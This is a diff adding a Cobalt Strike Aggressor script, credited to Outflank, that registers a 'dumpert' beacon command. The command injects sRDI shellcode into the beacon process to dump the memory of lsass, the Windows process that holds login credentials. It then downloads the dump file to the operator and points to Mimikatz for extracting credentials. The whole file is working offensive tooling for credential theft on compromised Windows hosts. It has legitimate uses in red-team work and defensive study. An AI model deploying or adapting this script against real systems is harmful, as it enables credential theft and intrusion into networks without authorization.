@@ -1,0 +1,35 @@
+#author Cornelis de Plaa
+#@outflank.nl
+
+#injects a sRDI shellcode (shellcode Reflective DLL Injection) in current process and creates a minidump of lsass process.
+#see https://github.com/monoxgas/sRDI
+
+#register help
+beacon_command_register("dumpert", "Create a minidump of lsass process",
+	"Synopsis: dumpert\n\n" .
+	"Creates a minidump of lsass process using sRDI shellcode injection and downloads minidump file.\n" .
+	"Lsass minidump can be imported in Mimikatz using: \"sekurlsa::minidump dumpert.dmp\"");
+
+alias dumpert {
+    $bid = $1;
+    $curr_pid = beacon_info($bid, "pid");
+
+    if (-isadmin $bid) {
+        blog($bid, "Dumpert by Outflank");
+        if (-is64 $bid) {
+            bshinject($bid, $curr_pid, "x64", script_resource("Outflank-Dumpert.bin"));
+            blog($bid, "Waiting a few seconds for task to complete...");
+            bpause($bid, 10000);
+            bdownload($bid, "C:\\Windows\\Temp\\dumpert.dmp");
+            return;
+        }
+        else{
+            berror($bid, "Dumpert is x64 only.");
+            return;
+        }
+    }
+    else{
+        berror($bid, "You need elevated privileges.");
+        return;
+    }
+}
